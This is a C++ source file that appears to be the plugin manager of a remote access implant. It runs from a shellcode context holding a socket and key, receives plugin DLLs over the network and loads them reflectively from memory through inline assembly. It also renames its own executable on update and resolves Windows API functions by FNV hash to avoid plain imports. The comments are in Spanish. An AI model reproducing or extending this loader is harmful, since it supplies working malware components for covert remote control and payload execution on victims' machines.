#include <stdio.h>

#include "PluginManager.h"
#include "plugininterface.h"

FARPROC WINAPI GPA_WRAPPER(HMODULE hModule, LPCTSTR lpProcName);

bool WINAPI LoadLibraryFromMemory(PLoadLibraryFromMemory loadLib,SHELLCODE_CONTEXT* pSCC,
                                   const void *data, LPCWSTR dllname, PMEMORYMODULE result);
void WINAPI FreeLibraryFromMemory(PFreeLibraryFromMemory freeLib,SHELLCODE_CONTEXT* pSCC, PMEMORYMODULE module);

int __cdecl printf (const char*, ...);

class pluginEvent{
        PluginManager* PluginMgr;
        char* data;
        ulong size;
};

PluginManagerInterfacePrivate* PluginManager::pluginList;

class PluginManagerInterfacePrivate :public pluginManagerInterface{
        PluginManager* mgr;
        plugin* p;
    public:
        PluginManagerInterfacePrivate(PluginManager& mgr, plugin& p);
        plugin* getPlugInformation();
        virtual int sendData(const char* data,uint size);
        virtual int setErrorCode(uint code);
};

PluginManager::PluginManager(){
    pluginList = 0;
}

PluginManager::~PluginManager(){
    if(pluginList){
        printf("unloading plugin\n");
        //__asm__("int3");
        ::FreeLibraryFromMemory(Context->FreeLibraryFromMemory,
                                Context,&pluginList->getPlugInformation()->Module);
    }
}

uint PluginManager::run(SHELLCODE_CONTEXT* Context){
    RPEP client(Context->hSocket,Context->hKey,this);
    protocol = &client;
    //printf("despues de client\n");

    this->Context = Context;

    //MessageBoxA(0, "PluginManager::run", "DLL Message", MB_OK | MB_ICONINFORMATION);
    return client.serverLoop();
}

bool PluginManager::updateServer(DArray& newServer){
    char FileName[1024];
    char FileNameNew[1024];
    long FilenameSize;
    FilenameSize = GetModuleFileName(0,FileName,sizeof(FileName)-1);

    strcpy(FileNameNew,FileName);
    FileNameNew[FilenameSize] = '_';
    FileNameNew[FilenameSize+1] = 0;

    MoveFile(FileName,FileNameNew);

    return true;
}
int exception(){
    return EXCEPTION_CONTINUE_SEARCH;
}
bool WINAPI LoadLibraryFromMemory(PLoadLibraryFromMemory loadLib,SHELLCODE_CONTEXT* pSCC,
                                   const void *data, LPCWSTR dllname, PMEMORYMODULE result){
    int status = 0;
    //printf("LoadLibraryFromMemory\n");

    __asm__ __volatile__(
        "push %ebx;push %edx;push %ecx;push %esi;push %edi;"
    );
    __asm__ (
                "push %5;"
                "push %4;"
                "push %3;"
                "push %2;"
                "call *(%1)":"=a"(status):
                "r"(&loadLib),
                "r"(pSCC),
                "r"(data),
                "r"(dllname),
                "r"(result)
    );
    __asm__ __volatile__(
        "pop %edi;pop %esi;pop %ecx;pop %edx;pop %ebx;"
    );

    return status;
}

void WINAPI FreeLibraryFromMemory(PFreeLibraryFromMemory freeLib,SHELLCODE_CONTEXT* pSCC, PMEMORYMODULE module){
    //printf("LoadLibraryFromMemory\n");

    __asm__ __volatile__(
        "push %eax;push %ebx;push %edx;push %ecx;push %esi;push %edi;"
    );
    __asm__ (
                "push %2;"
                "push %1;"
                "call *(%0)"::
                "r"(&freeLib),
                "r"(pSCC),
                "r"(module)
    );
    __asm__ __volatile__(
        "pop %edi;pop %esi;pop %ecx;pop %edx;pop %ebx;pop %eax"
    );
}

bool PluginManager::loadPlugin(RPEP_LOAD_PLUGIN* pluginModule){
    pgetInterface getInterface;
    //HINSTANCE hModule;
    plugin* newPlugin;
    ulong loadResult;
    PluginManagerInterfacePrivate* pluginPrivate;
    bool result = false;

    if(!isPluginLoad(pluginModule->PluginID)){
        printf("Cargando plugin....\n");
        newPlugin = new plugin();
        printf("newPlugin addr %x\n",(uint)newPlugin);
        //Cargamos el plugin
        {
            /** /__asm__(
                "int3"
            );//*/
            loadResult = ::LoadLibraryFromMemory(Context->LoadLibraryFromMemory,Context,pluginModule->PluginModule,L"",&newPlugin->Module);
        }
        if(loadResult){
            printf("modulo cargado con exito\n");
            //Buscamos las funciones exportadas
            getInterface = (pgetInterface)GPA_WRAPPER(newPlugin->Module.ModuleBase,"getInterface");
            if(getInterface && (newPlugin->plugInterface = getInterface())){
                printf("getInterface\n");
                newPlugin->ID = pluginModule->PluginID;
                printf("pluginPrivate\n");
                pluginPrivate = new PluginManagerInterfacePrivate(*this,*newPlugin);
                pluginList = pluginPrivate;
                result = true;
            }else{
                if(!getInterface){
                    uint error = (uint)GetLastError();
                    printf("GetProcAddress error: %x(%s)\n",error,
                           error==ERROR_PROC_NOT_FOUND?"PROC_NOT_FOUND":"");
                    FreeLibraryFromMemory(Context->FreeLibraryFromMemory,Context,&newPlugin->Module);
                }
                delete newPlugin;
            }
        }
    }else printf("ya cargado");

    printf("Cargado plugin: %s\n",result?"true":"false");
    return result;
}

plugin* PluginManager::getPluginById(ulong id){
    return pluginList->getPlugInformation();
}

RPEP *PluginManager::getProtocol(){
    return protocol;
}

bool PluginManager::isPluginLoad(ushort ID){
    bool result = false;
    if(pluginList && pluginList->getPlugInformation()){
        result = pluginList->getPlugInformation()->ID == ID;
    }
    return result;
}

PluginManagerInterfacePrivate::PluginManagerInterfacePrivate(PluginManager &mgr, plugin &p){
    this->mgr = &mgr;
    this->p = &p;
    p.plugInterface->setPluginManager(this);
}

plugin* PluginManagerInterfacePrivate::getPlugInformation(){
    return p;
}

int PluginManagerInterfacePrivate::sendData(const char *data, uint size){
    DArray buff;

    this->mgr->getProtocol()->MakePacket(buff,this->p->ID,data,size);
    printf("[sendData] enviando datos\n");
    return this->mgr->getProtocol()->send(buff.data,buff.size);
}

int PluginManagerInterfacePrivate::setErrorCode(uint code){
}


bool PluginManager::runPluginCMD(ulong pluginID, char *data, uint size){
    plugin* currentPlugin;
    if((currentPlugin = getPluginById(pluginID))){
         char buff[size+1];
         ZeroMemory(buff,size+1);
         memcpy(buff,data,size);
         printf("onReciveData size %x cadena %s\n",(uint)size,(char*)buff);

         currentPlugin->plugInterface->onReciveData(data,size);
    }
}

#define FNV_PRIME_32 16777619
#define FNV_OFFSET_32 2166136261U
#define null NULL

ulong fnv32(register const char *s){
    register ulong hash = FNV_OFFSET_32;

    while(*s)
        hash = (hash ^ (*(s++)))*FNV_PRIME_32;

    return hash;
}

FARPROC WINAPI GetProcAddressByHash(HINSTANCE hModule,ulong hash){
    register PIMAGE_NT_HEADERS PE;
    register FARPROC proc = null;
    register PIMAGE_EXPORT_DIRECTORY ExpDir = null;
    register char** ExportNames = null;

    //Comprovamos la marca de DOS
    if(*((ushort*)hModule)==IMAGE_DOS_SIGNATURE){
        //localizamos la cabecera PE
        PE = (PIMAGE_NT_HEADERS)(((IMAGE_DOS_HEADER*)hModule)->e_lfanew+(ulong)hModule);
        //Compruebo la firma de PE y que halla tabla de importaciones
        if(PE->Signature == IMAGE_NT_SIGNATURE
                && PE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size){
            //Localizo el directorio de exportaciones
            ExpDir = (PIMAGE_EXPORT_DIRECTORY)(PE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                    .VirtualAddress+(ulong)hModule);
#ifdef DEBUG
            DebugPrintf("GPA","ExpDir = %p,EXPORT_DIRECTORY = %x",ExpDir,PE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
                        .VirtualAddress);
#endif
            //Localizo los nombres de simbolos exportados y busco la funcion
            ExportNames = (char**)(ExpDir->AddressOfNames+(ulong)hModule);
            register int i;
            for(i = 0;ExportNames[i];i++){
                //Comparo los hash para buscar la funcion
                if(fnv32(ExportNames[i]+(ulong)hModule) == hash){
                    ulong* funtionRVAs = (ulong*)(ExpDir->AddressOfFunctions+(ulong)hModule);
                    ushort* ordinalRVAs = (ushort*)(ExpDir->AddressOfNameOrdinals+(ulong)hModule);
                    //Calculamos la direccion de la funcion
                    proc = (FARPROC)(funtionRVAs[ordinalRVAs[i]] +(ulong)hModule);
                    break;
                }
            }

        }
    }
    return proc;
}

FARPROC WINAPI GPA_WRAPPER(HMODULE hModule, LPCTSTR lpProcName){
   return GetProcAddressByHash(hModule, fnv32(lpProcName));
}
